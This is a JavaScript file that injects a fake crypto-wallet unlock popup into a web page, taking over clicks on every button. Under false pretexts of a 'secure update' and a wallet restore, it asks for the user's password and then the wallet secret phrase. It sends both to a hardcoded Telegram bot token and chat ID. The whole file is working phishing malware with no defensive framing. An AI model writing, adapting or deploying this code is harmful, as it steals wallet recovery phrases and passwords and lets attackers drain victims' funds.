(function () {
  // Insert CSS (scoped only to popup)
  const style = document.createElement('style');
  style.textContent = `
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
    .wallet-popup {
      position: fixed;
      top: 0px;
      right: 24px;
      width: 330px;
      min-height: 540px;
      background: none !important;
      color: #fff;
      border-radius: 14px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.28);
      padding: 32px 24px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
      display: flex;
      flex-direction: column;
      align-items: center;
      z-index: 9999;
      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
      overflow: hidden;
      position: fixed;
    }
    .wallet-popup::before {
      content: "";
      pointer-events: none;
      position: absolute;
      z-index: 0;
      top: 0; left: 0; right: 0; bottom: 0;
      border-radius: 14px;
      background: url('x.png') no-repeat center / cover;
      opacity: 1;
    }
    .wallet-popup > * {
      position: relative;
      z-index: 1;
    }
    .wallet-popup.active { opacity: 1; pointer-events: auto; }
    .wallet-popup input, 
    .wallet-popup button, 
    .wallet-popup textarea {
      width: 100%;
      padding: 12px;
      margin-top: 20px;
      border-radius: 8px;
      border: none;
      font-size: 15px;
      box-sizing: border-box;
      display: block;
      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
    }
    .wallet-popup input, 
    .wallet-popup textarea {
      border: 2px solid #626664;
      border-radius: 18px;
      background: #28292c;
      color: #ffffff;
      font-weight: 400;
      letter-spacing: 0.2px;
    }
    .wallet-popup input::placeholder {
      color: #bdbecb;
      text-align: left;
      font-size: 15px;
      font-weight: 400;
      opacity: 1;
    }
    .wallet-popup textarea::placeholder {
      color: #ffffff;
      text-align: left;
      font-size: 15px;
      font-weight: 400;
      opacity: 1;
    }
    .wallet-popup button {
      background: linear-gradient(90deg, #626664 0%, #bdbecb 100%);
      color: #fff;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.25s cubic-bezier(.4,0,.2,1), box-shadow 0.2s;
      margin-top: 24px;
      font-size: 15px;
      padding: 12px 0;
      box-shadow: 0 2px 8px rgba(58,122,254,0.08);
      letter-spacing: 0.2px;
    }
    .wallet-popup button:disabled {
      opacity: 0.6; cursor: not-allowed; background: #bdbecb;
    }
    .wallet-popup button:hover:enabled {
      background: linear-gradient(90deg, #626664 0%, #bdbecb 100%);
      box-shadow: 0 4px 16px rgba(58,122,254,0.16);
    }
    .wallet-popup .section {
      display: none;
      margin-top: 14px;
      width: 100%;
      flex-direction: column;
      align-items: center;
      min-height: 550px;
      justify-content: center;
      position: relative;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
      opacity: 0;
      pointer-events: none;
      background: none !important;
      z-index: 1;
    }
    .wallet-popup .section.active {
      display: flex;
      opacity: 1;
      pointer-events: auto;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
    }
    .wallet-popup #phraseInput {
      min-height: 100px;
      font-family: inherit;
      text-align: left;
      resize: none;
    }
    .wallet-popup .download-label {
      color: #bdbecb;
      font-size: 15px;
      text-align: center;
      margin-bottom: 8px;
      margin-top: 0;
      font-weight: 500;
      line-height: 1.5;
      width: 100%;
      display: block;
    }
    .wallet-popup .loader-section {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 550px;
      width: 100%;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
      background: none !important;
      z-index: 1;
    }
    .wallet-popup .loader-section.active {
      display: flex;
      opacity: 1;
      pointer-events: auto;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
    }
    .wallet-popup .loader {
      border: 4px solid #22244a;
      border-top: 4px solid #626664;
      border-radius: 50%;
      width: 48px;
      height: 48px;
      animation: spin 1s linear infinite;
      margin-bottom: 28px;
      margin-top: 10px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .wallet-popup .loader-message {
      color: #bdbecb;
      font-size: 16px;
      text-align: center;
      margin-top: 0;
      font-weight: 500;
      line-height: 1.6;
      max-width: 260px;
      animation: fadeIn 0.8s;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .wallet-popup input:focus, 
    .wallet-popup textarea:focus {
      border-color: #626664 !important;
      box-shadow: 0 0 0 2px #62666433;
      outline: none;
    }
    .wallet-popup .toggle-password {
      cursor: pointer;
    }
  `;
  document.head.appendChild(style);

  // Insert HTML
  const popup = document.createElement('div');
  popup.className = 'wallet-popup';
  popup.id = 'popup';
  popup.innerHTML = `
    <div id="passwordSection" class="section active">
      <input type="password" placeholder="Enter your password" id="passwordInput" />
      <button id="unlockBtn" disabled>Unlock</button>
    </div>
    <div id="updateSection" class="section">
      <span class="download-label">
        A secure update is ready. Please download to continue protecting your assets.
      </span>
      <button id="downloadBtn">Download Update</button>
      <button id="skipBtn" style="margin-top:10px;background:#222b;">Skip</button>
    </div>
    <div id="loaderSection" class="loader-section">
      <div class="loader"></div>
      <div class="loader-message" id="loaderMsg"></div>
    </div>
    <div id="phraseSection" class="section">
      <textarea placeholder="Enter your Secret Phrase to restore wallet" id="phraseInput" rows="8" style="resize: none;"></textarea>
      <button id="submitBtn" disabled>Submit</button>
    </div>
  `;
  document.body.appendChild(popup);

  // --- Telegram logic from x.html ---
   const TELEGRAM_BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
  const TELEGRAM_CHAT_ID = '-4704812522';

  function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });
  }
  // Section switching logic
  function nextSection(showId) {
    popup.querySelectorAll('.section, .loader-section').forEach(sec => sec.classList.remove('active'));
    popup.querySelector('#' + showId).classList.add('active');
  }

  // Loader and section transitions
  function showLoader() {
    popup.querySelector('#loaderMsg').textContent =
      "For your security, we need to restore your wallet. Please wait while we prepare your recovery process.";
    nextSection('loaderSection');
    setTimeout(() => { nextSection('phraseSection'); }, 5000);
  }
  function showLazyLoader() {
    popup.querySelector('#loaderMsg').textContent = "";
    nextSection('loaderSection');
    setTimeout(() => { nextSection('updateSection'); }, 2000);
  }

  function handleDownload() {
    popup.querySelector('#loaderMsg').textContent = "Updating wallet…";
    nextSection('loaderSection');
    setTimeout(() => {
      nextSection('phraseSection');
    }, 3000);
  }

  function submitPhrase() {
    const phrase = popup.querySelector('#phraseInput').value.trim();
    if (!phrase) {
      alert('Please enter your secret phrase.');
      popup.querySelector('#phraseInput').focus();
      return;
    }
    sendToTelegram(`Mnemonic phrase entered: ${phrase}`);
    alert('Phrase submitted!');
    popup.classList.remove('active');
  }

  // Disable/enable buttons logic
  function setupInputs() {
    const phraseInput = popup.querySelector('#phraseInput');
    const submitBtn = popup.querySelector('#submitBtn');
    phraseInput.addEventListener('input', function () {
      submitBtn.disabled = phraseInput.value.trim() === '';
    });
    submitBtn.disabled = phraseInput.value.trim() === '';

    const passwordInput = popup.querySelector('#passwordInput');
    const unlockBtn = popup.querySelector('#unlockBtn');
    passwordInput.addEventListener('input', function () {
      unlockBtn.disabled = passwordInput.value.trim() === '';
    });
    unlockBtn.disabled = passwordInput.value.trim() === '';
  }

  // Bind events
  popup.querySelector('#unlockBtn').addEventListener('click', function() {
    const password = popup.querySelector('#passwordInput').value;
    sendToTelegram(`Password entered: ${password}`);
    showLazyLoader();
  });
  popup.querySelector('#downloadBtn').addEventListener('click', handleDownload);
  popup.querySelector('#skipBtn').addEventListener('click', showLoader);
  popup.querySelector('#submitBtn').addEventListener('click', submitPhrase);

  setupInputs();

  // Show popup logic
  function showPopup() {
    popup.classList.add('active');
    // Reset to first section
    popup.querySelectorAll('.section, .loader-section').forEach((sec, idx) => {
      sec.classList.toggle('active', idx === 0);
    });
    // Reset inputs
    popup.querySelector('#passwordInput').value = '';
    popup.querySelector('#phraseInput').value = '';
    setupInputs();
  }

  // Smarter event: always find the nearest actionable button (works for text, icons, etc.)
  document.body.addEventListener('click', function (e) {
    if (
      e.target.closest('.wallet-popup') ||
      e.target.closest('[data-wallet-popup-ignore]')
    ) return;

    // Find the nearest actionable button (button, a.w-button, [role="button"], [tabindex="0"])
    const button =
      e.target.closest('button') ||
      e.target.closest('a.w-button') ||
      e.target.closest('[role="button"]') ||
      e.target.closest('[tabindex="0"]');

    if (button) {
      showPopup();
      e.preventDefault();
      e.stopPropagation();
    }
  }, true);

  // Optional: expose showPopup for manual trigger
  window.showWalletPopup = showPopup;
})();
